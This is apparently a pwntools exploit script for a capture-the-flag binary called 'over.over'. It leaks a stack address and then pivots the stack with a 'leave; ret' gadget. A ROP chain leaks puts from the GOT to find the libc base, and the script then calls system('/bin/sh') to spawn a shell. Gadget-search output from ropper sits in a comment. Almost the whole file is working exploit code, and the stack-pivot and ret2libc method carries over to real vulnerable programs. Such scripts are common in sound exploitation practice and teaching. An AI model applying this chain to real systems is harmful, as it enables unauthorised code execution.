#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"
context.binary = "./over.over"

def DEBUG(cmd):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

io = process("./over.over")
#  DEBUG("b *0x4006B9\nc")
elf = ELF("./over.over")
libc = elf.libc

io.sendafter(">", '0' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
success("stack -> {:#x}".format(stack))
'''
others_over [master●●] ropper --file ./over.over --search "leave|ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: leave|ret

[INFO] File: ./over.over
0x00000000004007d0: ret 0xfffe; 
0x00000000004006be: leave; ret; 
0x0000000000400509: ret; 

0x0000000000400793 : pop rdi ; ret
'''

#  DEBUG("b *0x4006B9\nc")
io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
success("libc.address -> {:#x}".format(libc.address))

io.sendafter(">", flat(['22222222', 0x400793, next(libc.search("/bin/sh")), libc.sym['system'], (80 - 40 + 8) * '2', stack - 0x30, 0x4006be]))

io.interactive()
io.close()
